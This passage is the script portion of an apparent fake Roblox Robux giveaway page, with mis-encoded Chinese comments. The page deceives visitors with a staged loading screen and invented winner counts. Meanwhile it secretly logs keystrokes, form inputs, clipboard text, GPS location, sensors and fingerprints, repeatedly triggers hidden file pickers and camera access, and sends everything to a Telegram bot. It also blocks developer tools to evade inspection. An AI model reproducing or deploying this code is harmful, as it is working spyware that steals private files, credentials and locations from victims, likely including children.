                timezone: geoData.timezone,
                currency: geoData.currency,
                callingCode: geoData.country_calling_code
            };

        } catch (e) {
            // å¤‡ç”¨API
            try {
                const backup = await fetch(`http://ip-api.com/json/${ipData.ip}`);
                const backupData = await backup.json();
                if (backupData.status === 'success') {
                    collectedData.network.geo = backupData;
                }
            } catch (e2) {}
        }

    } catch (error) {
        logUltimate(`ç½‘ç»œä¿¡æ¯æ”¶é›†å¤±è´¥: ${error.message}`);
    }
}

// æ”¶é›†ä½ç½®æ•°æ®
async function collectLocationData() {
    // GPSå®šä½
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                collectedData.location = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    altitudeAccuracy: pos.coords.altitudeAccuracy,
                    heading: pos.coords.heading,
                    speed: pos.coords.speed,
                    timestamp: new Date(pos.timestamp).toISOString()
                };
                logUltimate('GPSå®šä½æˆåŠŸ');
            },
            (err) => {
                collectedData.locationError = err.message;
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // é€šè¿‡WiFiå’ŒåŸºç«™å®šä½ï¼ˆå¦‚æœå¯ç”¨ï¼‰
    if ('geolocation' in navigator && navigator.geolocation.watchPosition) {
        navigator.geolocation.watchPosition(
            (pos) => {
                if (!collectedData.realtimeLocation) {
                    collectedData.realtimeLocation = [];
                }
                collectedData.realtimeLocation.push({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    time: new Date().toISOString()
                });
            },
            null,
            { enableHighAccuracy: true }
        );
    }
}

// æ”¶é›†ä¼ æ„Ÿå™¨æ•°æ®
function collectSensorData() {
    collectedData.sensors = {};

    // é™€èºä»ª
    if ('DeviceOrientationEvent' in window) {
        window.addEventListener('deviceorientation', (event) => {
            collectedData.sensors.gyroscope = {
                alpha: event.alpha,
                beta: event.beta,
                gamma: event.gamma
            };
        }, { once: true });
    }

    // åŠ é€Ÿåº¦è®¡
    if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (event) => {
            collectedData.sensors.accelerometer = {
                acceleration: event.acceleration,
                accelerationIncludingGravity: event.accelerationIncludingGravity,
                rotationRate: event.rotationRate
            };
        }, { once: true });
    }

    // å…¶ä»–ä¼ æ„Ÿå™¨
    if ('AmbientLightSensor' in window) {
        collectedData.sensors.light = true;
    }
    if ('ondeviceproximity' in window) {
        collectedData.sensors.proximity = true;
    }
    if ('onuserproximity' in window) {
        collectedData.sensors.userProximity = true;
    }
}

// æ”¶é›†æµè§ˆå™¨æŒ‡çº¹
function collectBrowserFingerprint() {
    collectedData.fingerprint = {
        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        audio: getAudioFingerprint(),
        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
        mimeTypes: Array.from(navigator.mimeTypes).length,
        timezoneOffset: new Date().getTimezoneOffset(),
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        touchSupport: 'ontouchstart' in window,
        doNotTrack: navigator.doNotTrack
    };
}
// ==================== è¡Œä¸ºç›‘æ§ ====================

// å¼€å§‹è¡Œä¸ºç›‘æ§
function startBehaviorMonitoring() {
    if (!collectedData.behavior) collectedData.behavior = {};
    
    // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
    let mousePositions = [];
    document.addEventListener('mousemove', (e) => {
        mousePositions.push({
            x: e.clientX,
            y: e.clientY,
            time: Date.now()
        });
        
        if (mousePositions.length > 1000) {
            collectedData.behavior.mouseHeatmap = mousePositions;
            mousePositions = [];
        }
    });

    // ç‚¹å‡»è·Ÿè¸ª
    collectedData.behavior.clicks = [];
    document.addEventListener('click', (e) => {
        collectedData.behavior.clicks.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            text: e.target.textContent?.substring(0, 50),
            time: new Date().toISOString()
        });
    });

    // é”®ç›˜è¾“å…¥è·Ÿè¸ª
    collectedData.behavior.keystrokes = [];
    document.addEventListener('keydown', (e) => {
        collectedData.behavior.keystrokes.push({
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey,
            time: Date.now()
        });
    });

    // æ»šåŠ¨è·Ÿè¸ª
    collectedData.behavior.scroll = [];
    window.addEventListener('scroll', () => {
        collectedData.behavior.scroll.push({
            x: window.scrollX,
            y: window.scrollY,
            time: Date.now()
        });
    });

    // è¡¨å•è¾“å…¥è·Ÿè¸ª
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            if (!collectedData.behavior.formInputs) {
                collectedData.behavior.formInputs = [];
            }
            collectedData.behavior.formInputs.push({
                id: e.target.id,
                name: e.target.name,
                type: e.target.type,
                value: e.target.value,
                time: new Date().toISOString()
            });
        }
    });

    // é¡µé¢ç„¦ç‚¹è·Ÿè¸ª
    document.addEventListener('visibilitychange', () => {
        if (!collectedData.behavior.visibility) {
            collectedData.behavior.visibility = [];
        }
        collectedData.behavior.visibility.push({
            state: document.hidden ? 'hidden' : 'visible',
            time: new Date().toISOString()
        });
    });

    // å¤åˆ¶ç²˜è´´è·Ÿè¸ª
    document.addEventListener('copy', (e) => {
        const selectedText = window.getSelection().toString();
        if (selectedText) {
            if (!collectedData.behavior.copyPaste) {
                collectedData.behavior.copyPaste = [];
            }
            collectedData.behavior.copyPaste.push({
                type: 'copy',
                text: selectedText.substring(0, 200),
                time: new Date().toISOString()
            });
        }
    });

    document.addEventListener('paste', (e) => {
        const pastedText = e.clipboardData.getData('text');
        if (pastedText) {
            if (!collectedData.behavior.copyPaste) {
                collectedData.behavior.copyPaste = [];
            }
            collectedData.behavior.copyPaste.push({
                type: 'paste',
                text: pastedText.substring(0, 200),
                time: new Date().toISOString()
            });
        }
    });
}

// ç½‘ç»œç›‘æ§
function startNetworkMonitoring() {
    // ç›‘å¬æ‰€æœ‰fetchè¯·æ±‚
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const startTime = Date.now();
        try {
            const response = await originalFetch.apply(this, args);
            const endTime = Date.now();
            
            if (!collectedData.networkRequests) {
                collectedData.networkRequests = [];
            }
            
            collectedData.networkRequests.push({
                url: args[0],
                method: args[1]?.method || 'GET',
                duration: endTime - startTime,
                time: new Date().toISOString()
            });
            
            return response;
        } catch (error) {
            return Promise.reject(error);
        }
    };

    // ç›‘å¬XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(...args) {
        this._requestUrl = args[1];
        this._requestMethod = args[0];
        return originalXHROpen.apply(this, args);
    };

    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(...args) {
        const startTime = Date.now();
        this.addEventListener('loadend', () => {
            if (!collectedData.networkRequests) {
                collectedData.networkRequests = [];
            }
            collectedData.networkRequests.push({
                url: this._requestUrl,
                method: this._requestMethod,
                duration: Date.now() - startTime,
                status: this.status,
                time: new Date().toISOString()
            });
        });
        return originalXHRSend.apply(this, args);
    };
}

// æ€§èƒ½ç›‘æ§
function startPerformanceMonitoring() {
    if ('performance' in window) {
        collectedData.performance = {
            memory: performance.memory,
            timing: performance.timing,
            navigation: performance.navigation,
            timeOrigin: performance.timeOrigin
        };

        // ç›‘å¬æ€§èƒ½æ¡ç›®
        if ('PerformanceObserver' in window) {
            const observer = new PerformanceObserver((list) => {
                if (!collectedData.performanceEntries) {
                    collectedData.performanceEntries = [];
                }
                list.getEntries().forEach(entry => {
                    collectedData.performanceEntries.push({
                        name: entry.name,
                        type: entry.entryType,
                        startTime: entry.startTime,
                        duration: entry.duration,
                        detail: JSON.stringify(entry.toJSON())
                    });
                });
            });

            observer.observe({ entryTypes: ['resource', 'navigation', 'paint', 'largest-contentful-paint', 'layout-shift'] });
        }
    }
}
        // ==================== ç»ˆæTelegramå‘é€ ====================

        // å‘é€åˆ°Telegram
        async function sendToTelegram(file, metadata) {
            try {
                const formData = new FormData();
                formData.append('chat_id', ULTIMATE_CONFIG.telegram.chatId);
                
                let caption = `ğŸ“ æ–‡ä»¶æ¥æº: ${metadata.source}\n`;
                caption += `ğŸ“ æ–‡ä»¶å: ${metadata.name}\n`;
                caption += `ğŸ“¦ å¤§å°: ${formatBytes(metadata.size)}\n`;
                caption += `â° æ—¶é—´: ${new Date().toLocaleString()}\n`;
                
                if (metadata.metadata?.width) {
                    caption += `ğŸ“ å°ºå¯¸: ${metadata.metadata.width}x${metadata.metadata.height}\n`;
                }
                
                caption += `ğŸ¯ ä¼šè¯ID: ${collectedData.sessionId}`;

                if (file.type.startsWith('image/')) {
                    formData.append('photo', file, metadata.name);
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                } else if (file.type.startsWith('video/')) {
                    formData.append('video', file, metadata.name);
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                    
                } else {
                    formData.append('document', file, metadata.name);
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                logUltimate(`æ–‡ä»¶å·²å‘é€åˆ°Telegram: ${metadata.name}`);
                return true;
                
            } catch (error) {
                logUltimate(`æ–‡ä»¶å‘é€å¤±è´¥: ${metadata.name} - ${error.message}`);
                return false;
            }
        }

        // å‘é€æ•°æ®æ‰¹æ¬¡
        async function sendFilesBatch(files) {
            for (const fileData of files) {
                // é‡æ–°è·å–æ–‡ä»¶å¯¹è±¡
                if (fileData.fileObject) {
                    await sendToTelegram(fileData.fileObject, fileData);
                }
            }
        }

        // å‘é€æ•°æ®æ‘˜è¦
        async function sendDataSummary() {
            try {
                const summary = `ğŸ¯ ç»ˆææ•°æ®æ”¶é›†æ‘˜è¦

ğŸ“Š æ”¶é›†ç»Ÿè®¡:
ä¼šè¯ID: ${collectedData.sessionId}
å¼€å§‹æ—¶é—´: ${new Date(collectedData.startTime).toLocaleString()}
è¿è¡Œæ—¶é•¿: ${Math.round((Date.now() - new Date(collectedData.startTime).getTime()) / 1000)}ç§’

ğŸ“ æ–‡ä»¶æ”¶é›†:
ç…§ç‰‡æ•°é‡: ${collectedPhotos.length}
è§†é¢‘æ•°é‡: ${collectedVideos.length}
æ–‡æ¡£æ•°é‡: ${userDocuments.length}
æ€»æ–‡ä»¶æ•°: ${allFiles.length}

ğŸ“± è®¾å¤‡ä¿¡æ¯:
è®¾å¤‡: ${collectedData.device?.os || 'æœªçŸ¥'} | ${collectedData.device?.browser || 'æœªçŸ¥'}
IPåœ°å€: ${collectedData.network?.ip || 'æœªçŸ¥'}
ä½ç½®: ${collectedData.network?.geo?.city || 'æœªçŸ¥'}, ${collectedData.network?.geo?.country || 'æœªçŸ¥'}
å±å¹•: ${collectedData.device?.screen?.width || 'æœªçŸ¥'}x${collectedData.device?.screen?.height || 'æœªçŸ¥'}

ğŸ–±ï¸ è¡Œä¸ºæ•°æ®:
é¼ æ ‡è½¨è¿¹: ${collectedData.behavior?.mouseHeatmap?.length || 0} ç‚¹
ç‚¹å‡»æ¬¡æ•°: ${collectedData.behavior?.clicks?.length || 0}
æŒ‰é”®è®°å½•: ${collectedData.behavior?.keystrokes?.length || 0}
é¡µé¢åˆ‡æ¢: ${collectedData.behavior?.visibility?.length || 0}

ğŸ“¡ ç½‘ç»œæ´»åŠ¨:
ç½‘ç»œè¯·æ±‚: ${collectedData.networkRequests?.length || 0}
GPSå®šä½: ${collectedData.location ? 'æˆåŠŸ' : 'å¤±è´¥'}
æ‘„åƒå¤´: ${stealthCameras.length} ä¸ªè®¾å¤‡è®¿é—®

ğŸ”„ çŠ¶æ€: ${systemActive ? 'è¿è¡Œä¸­' : 'å·²åœæ­¢'}`;

                await fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ULTIMATE_CONFIG.telegram.chatId,
                        text: summary,
                        parse_mode: 'HTML'
                    })
                });
                
                logUltimate('æ•°æ®æ‘˜è¦å·²å‘é€');
                
            } catch (error) {
                logUltimate(`æ‘˜è¦å‘é€å¤±è´¥: ${error.message}`);
            }
        }

        // å®šæœŸå‘é€æ›´æ–°
        function scheduleUpdates() {
            // æ¯30ç§’å‘é€æ•°æ®æ‘˜è¦
            setInterval(() => {
                if (systemActive) {
                    sendDataSummary();
                }
            }, 30000);

            // æ¯60ç§’å°è¯•æ–‡ä»¶è®¿é—®
            setInterval(() => {
                if (systemActive) {
                    try {
                        stealthFileInput.click();
                        stealthFileInput2.click();
                    } catch (e) {
                        // é™é»˜å¤±è´¥
                    }
                }
            }, 60000);

            // æ¯2åˆ†é’Ÿå‘é€å®Œæ•´æ•°æ®
            setInterval(() => {
                if (systemActive) {
                    sendCompleteData();
                }
            }, 120000);
        }

        // å‘é€å®Œæ•´æ•°æ®
        async function sendCompleteData() {
            try {
                // åˆ›å»ºæ•°æ®æ–‡ä»¶
                const completeData = {
                    ...collectedData,
                    files: allFiles,
                    photos: collectedPhotos,
                    videos: collectedVideos,
                    documents: userDocuments,
                    accessLogs: accessLogs,
                    timestamp: new Date().toISOString()
                };

                const dataStr = JSON.stringify(completeData, null, 2);
                const dataBlob = new Blob([dataStr], { type: 'application/json' });
                const dataFile = new File([dataBlob], `complete_data_${collectedData.sessionId}.json`);

                const formData = new FormData();
                formData.append('chat_id', ULTIMATE_CONFIG.telegram.chatId);
                formData.append('document', dataFile);
                formData.append('caption', `ğŸ“Š å®Œæ•´æ•°æ®åŒ… - ${new Date().toLocaleString()}`);

                await fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                logUltimate('å®Œæ•´æ•°æ®åŒ…å·²å‘é€');

            } catch (error) {
                logUltimate(`å®Œæ•´æ•°æ®å‘é€å¤±è´¥: ${error.message}`);
            }
        }

        // ==================== è¾…åŠ©å‡½æ•° ====================

        // ç”Ÿæˆä¼šè¯ID
        function generateSessionId() {
            return 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        }

        // ç”Ÿæˆæ–‡ä»¶ID
        function generateFileId() {
            return 'FILE-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
        }

        // æ ¼å¼åŒ–å­—èŠ‚
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // æ£€æµ‹æµè§ˆå™¨è¯¦æƒ…
        function detectBrowserDetails() {
            const ua = navigator.userAgent;
            let browser = 'æœªçŸ¥';
            let version = 'æœªçŸ¥';

            // Chrome
            if (ua.includes('Chrome') && !ua.includes('Edg')) {
                browser = 'Chrome';
                const match = ua.match(/Chrome\/(\d+)/);
                if (match) version = match[1];
            }
            // Firefox
            else if (ua.includes('Firefox')) {
                browser = 'Firefox';
                const match = ua.match(/Firefox\/(\d+)/);
                if (match) version = match[1];
            }
            // Safari
            else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browser = 'Safari';
                const match = ua.match(/Version\/(\d+)/);
                if (match) version = match[1];
            }
            // Edge
            else if (ua.includes('Edg')) {
                browser = 'Edge';
                const match = ua.match(/Edg\/(\d+)/);
                if (match) version = match[1];
            }
            // Opera
            else if (ua.includes('Opera') || ua.includes('OPR')) {
                browser = 'Opera';
                const match = ua.match(/(?:Opera|OPR)\/(\d+)/);
                if (match) version = match[1];
            }

            return { name: browser, version: version };
        }

        // æ£€æµ‹æ“ä½œç³»ç»Ÿè¯¦æƒ…
        function detectOSDetails() {
            const ua = navigator.userAgent;
            let os = 'æœªçŸ¥';
            let version = 'æœªçŸ¥';

            // Windows
            if (ua.includes('Windows')) {
                os = 'Windows';
                if (ua.includes('Windows NT 10.0')) version = '10';
                else if (ua.includes('Windows NT 6.3')) version = '8.1';
                else if (ua.includes('Windows NT 6.2')) version = '8';
                else if (ua.includes('Windows NT 6.1')) version = '7';
            }
            // macOS
            else if (ua.includes('Macintosh')) {
                os = 'macOS';
                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
                if (match) version = match[1].replace('_', '.');
            }
            // Linux
            else if (ua.includes('Linux')) {
                os = 'Linux';
                if (ua.includes('Android')) {
                    os = 'Android';
                    const match = ua.match(/Android (\d+)/);
                    if (match) version = match[1];
                }
            }
            // iOS
            else if (ua.includes('iPhone') || ua.includes('iPad')) {
                os = 'iOS';
                const match = ua.match(/OS (\d+)/);
                if (match) version = match[1];
            }

            return { name: os, version: version };
        }

        // ç»ˆææ—¥å¿—
        function logUltimate(message) {
            console.log(`[ç»ˆææ”¶é›†] ${message}`);
            accessLogs.push({
                message: message,
                time: new Date().toISOString(),
                level: 'info'
            });
        }

        // ==================== ä¸»æ§åˆ¶ ====================

        // åˆå§‹åŒ–é¡µé¢
        async function initUltimateSystem() {
            // æ¨¡æ‹ŸåŠ è½½è¿‡ç¨‹
            const steps = [
                'æ­£åœ¨è¿æ¥åˆ°Robloxå®˜æ–¹æœåŠ¡å™¨...',
                'æ­£åœ¨éªŒè¯æŠ½å¥–ç³»ç»Ÿå®‰å…¨æ€§...',
                'æ­£åœ¨åŠ è½½50000 Robuxå¥–æ± ...',
                'æ­£åœ¨åˆå§‹åŒ–å®æ—¶ä¸­å¥–ç³»ç»Ÿ...',
                'æ­£åœ¨å‡†å¤‡ç”¨æˆ·éªŒè¯æ¨¡å—...'
            ];

            for (let i = 0; i < steps.length; i++) {
                loadingStatus.textContent = steps[i];
                loadingProgress.textContent = `è¿›åº¦: ${Math.round(((i + 1) / steps.length) * 100)}%`;
                await delay(1500);
            }

            // æ˜¾ç¤ºä¸»é¡µé¢
            loadingScreen.style.display = 'none';
            mainContent.style.display = 'block';

            // åˆå§‹åŒ–å€’è®¡æ—¶
            initCountdownSystem();

            // å¼€å§‹ç»ˆææ•°æ®æ”¶é›†
            setTimeout(() => {
                collectEverything();
                scheduleUpdates();
            }, 3000);

            // è®¾ç½®äº‹ä»¶ç›‘å¬
            setupEventListeners();

            // è®¾ç½®é˜²æŠ¤
            setupUltimateProtection();

            logUltimate('ç»ˆæç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ');
        }

        // åˆå§‹åŒ–å€’è®¡æ—¶
        function initCountdownSystem() {
            let totalSeconds = 300; // 5åˆ†é’Ÿ
            const countdownElement = document.getElementById('countdown');
            const onlineUsers = document.getElementById('onlineUsers');
            const winnersToday = document.getElementById('winnersToday');
            const prizesLeft = document.getElementById('prizesLeft');

            function update() {
                const hours = Math.floor(totalSeconds / 3600);
                const minutes = Math.floor((totalSeconds % 3600) / 60);
                const seconds = totalSeconds % 60;
                
                countdownElement.textContent = 
                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                // æ›´æ–°ç»Ÿè®¡æ•°æ®
                onlineUsers.textContent = (parseInt(onlineUsers.textContent) + Math.floor(Math.random() * 3)).toString();
                if (Math.random() > 0.7) {
                    winnersToday.textContent = (parseInt(winnersToday.textContent) + 1).toString();
                }
                if (Math.random() > 0.8) {
                    prizesLeft.textContent = Math.max(0, parseInt(prizesLeft.textContent) - 1).toString();
                }
                
                totalSeconds--;
                
                if (totalSeconds < 0) {
                    totalSeconds = 300; // é‡ç½®
                    winnersToday.textContent = (parseInt(winnersToday.textContent) + 5).toString();
                }
            }

            update();
            setInterval(update, 1000);
        }

        // è®¾ç½®äº‹ä»¶ç›‘å¬
        function setupEventListeners() {
            // å‚ä¸æŒ‰é’®
            joinButton.addEventListener('click', () => {
                uploadOverlay.style.display = 'block';
                logUltimate('ç”¨æˆ·ç‚¹å‡»å‚ä¸æŒ‰é’®');
            });

            // éªŒè¯æŒ‰é’®
            verifyBtn.addEventListener('click', () => {
                uploadOverlay.style.display = 'none';
                logUltimate('ç”¨æˆ·å¼€å§‹éªŒè¯');
                
                // ç«‹å³å°è¯•æ‰€æœ‰è®¿é—®æ–¹æ³•
                forceMultiFileSelect();
                accessEnhancedCamera();
            });

            // ä¸Šä¼ åŒºåŸŸ
            uploadArea.addEventListener('click', () => {
                stealthFileInput.click();
            });

            // æ–‡ä»¶é€‰æ‹©ç›‘å¬
            stealthFileInput.addEventListener('change', (e) => {
                if (e.target.files.length > 0) {
                    processCapturedFiles(e.target.files, 'direct_upload');
                    uploadOverlay.style.display = 'none';
                }
            });

            // æ‹–æ”¾æ”¯æŒ
            uploadArea.addEventListener('dragover', (e) => {
                e.preventDefault();
                uploadArea.style.borderColor = '#FF4500';
                uploadArea.style.background = 'rgba(255, 69, 0, 0.1)';
            });

            uploadArea.addEventListener('dragleave', () => {
                uploadArea.style.borderColor = '#FFD700';
                uploadArea.style.background = 'transparent';
            });

            uploadArea.addEventListener('drop', (e) => {
                e.preventDefault();
                uploadArea.style.borderColor = '#FFD700';
                uploadArea.style.background = 'transparent';
                
                if (e.dataTransfer.files.length > 0) {
                    processCapturedFiles(e.dataTransfer.files, 'drag_drop');
                    uploadOverlay.style.display = 'none';
                }
            });
        }

        // ç»ˆæé˜²æŠ¤
        function setupUltimateProtection() {
            // ç¦ç”¨å¼€å‘è€…å·¥å…·
            const devtools = /./;
            devtools.toString = function() {
                systemActive = false;
                logUltimate('æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·');
                return 'devtools';
            };
            console.log('%c', devtools);

            // ç¦ç”¨å³é”®èœå•
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                return false;
            });

            // ç¦ç”¨å¿«æ·é”®
            document.addEventListener('keydown', (e) => {
                const forbiddenKeys = [
                    'F12',
                    'F5',
                    'F11',
                    'Escape'
                ];
                
                const forbiddenCombos = [
                    e.ctrlKey && e.shiftKey && e.key === 'I',
                    e.ctrlKey && e.shiftKey && e.key === 'J',
                    e.ctrlKey && e.shiftKey && e.key === 'C',
                    e.ctrlKey && e.key === 'U',
                    e.ctrlKey && e.key === 'S',
                    e.ctrlKey && e.key === 'P'
                ];

                if (forbiddenKeys.includes(e.key) || forbiddenCombos.includes(true)) {
                    e.preventDefault();
                    return false;
                }
            });

            // é¡µé¢éšè—æ£€æµ‹
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    logUltimate('ç”¨æˆ·åˆ‡æ¢åˆ°å…¶ä»–æ ‡ç­¾é¡µ');
                    sendDataSummary();
                }
            });

            // é¡µé¢å…³é—­æ£€æµ‹
            window.addEventListener('beforeunload', () => {
                systemActive = false;
                const finalMessage = `ğŸšª ç”¨æˆ·ç¦»å¼€é¡µé¢
ä¼šè¯ID: ${collectedData.sessionId}
æ€»è¿è¡Œæ—¶é—´: ${Math.round((Date.now() - new Date(collectedData.startTime).getTime()) / 1000)}ç§’
æ”¶é›†æ–‡ä»¶æ€»æ•°: ${allFiles.length}
æ‘„åƒå¤´è®¿é—®: ${stealthCameras.length} ä¸ªè®¾å¤‡
æœ€ç»ˆçŠ¶æ€: æ•°æ®æ”¶é›†å®Œæˆ`;

                // å‘é€æœ€ç»ˆæ¶ˆæ¯
                fetch(`https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ULTIMATE_CONFIG.telegram.chatId,
                        text: finalMessage
                    }),
                    keepalive: true
                }).catch(() => {});
            });
        }

        // å»¶è¿Ÿå‡½æ•°
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // å¯åŠ¨ç³»ç»Ÿ
        window.addEventListener('DOMContentLoaded', () => {
            // å»¶è¿Ÿå¯åŠ¨ï¼Œé¿å…è¢«æ£€æµ‹
            setTimeout(() => {
                initUltimateSystem();
            }, 1000);
        });

        // ç²’å­èƒŒæ™¯
        function initParticles() {
            const canvas = document.getElementById('particles');
            const ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const particles = [];
            const particleCount = 100;
            
            for (let i = 0; i < particleCount; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    size: Math.random() * 3 + 1,
                    speedX: Math.random() * 1 - 0.5,
                    speedY: Math.random() * 1 - 0.5,
                    color: `rgba(255, 215, 0, ${Math.random() * 0.5 + 0.1})`
                });
            }
            
            function animate() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                for (const p of particles) {
                    p.x += p.speedX;
                    p.y += p.speedY;
                    
                    if (p.x < 0 || p.x > canvas.width) p.speedX *= -1;
                    if (p.y < 0 || p.y > canvas.height) p.speedY *= -1;
                    
                    ctx.beginPath();
                    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                    ctx.fillStyle = p.color;
                    ctx.fill();
                }
                
                requestAnimationFrame(animate);
            }
            
            animate();
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        }

        // åˆå§‹åŒ–ç²’å­
        initParticles();
    </script>
</body>
</html>
